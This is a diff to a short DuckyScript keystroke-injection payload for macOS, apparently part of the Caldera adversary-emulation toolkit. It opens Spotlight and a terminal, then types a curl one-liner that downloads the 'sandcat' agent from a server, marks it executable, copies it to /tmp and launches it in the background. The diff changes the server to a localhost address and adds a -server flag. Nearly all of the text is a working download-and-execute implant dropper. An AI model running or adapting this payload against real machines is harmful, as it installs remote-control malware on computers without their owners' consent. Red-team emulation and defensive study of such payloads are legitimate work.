@@ -1,5 +1,4 @@
-STRING server=""
-DELAY 1000
+DELAY 100
 
 REM Open the "Spotlight Search" and pull up the terminal/cli
 GUI SPACE
@@ -9,7 +8,7 @@ ENTER
 DELAY 1000
 
 REM Deploy 54ndc47 in background
-STRING (server='$server';agent=$(curl -svkOJ -X POST -H 'file:sandcat.go' -H 'platform:darwin' -H "server:$server" $server/file/download 2>&1 | grep -i 'Content-Disposition' | grep -io 'filename=.*' | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null && cp $agent /tmp && /tmp/$agent &)
+STRING (server='http://127.0.0.1:8888';agent=$(curl -svkOJ -X POST -H 'file:sandcat.go' -H 'platform:darwin' -H "server:$server" $server/file/download 2>&1 | grep -i 'Content-Disposition' | grep -io 'filename=.*' | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null && cp $agent /tmp && /tmp/$agent -server $server &)
 
 DELAY 100
 ENTER
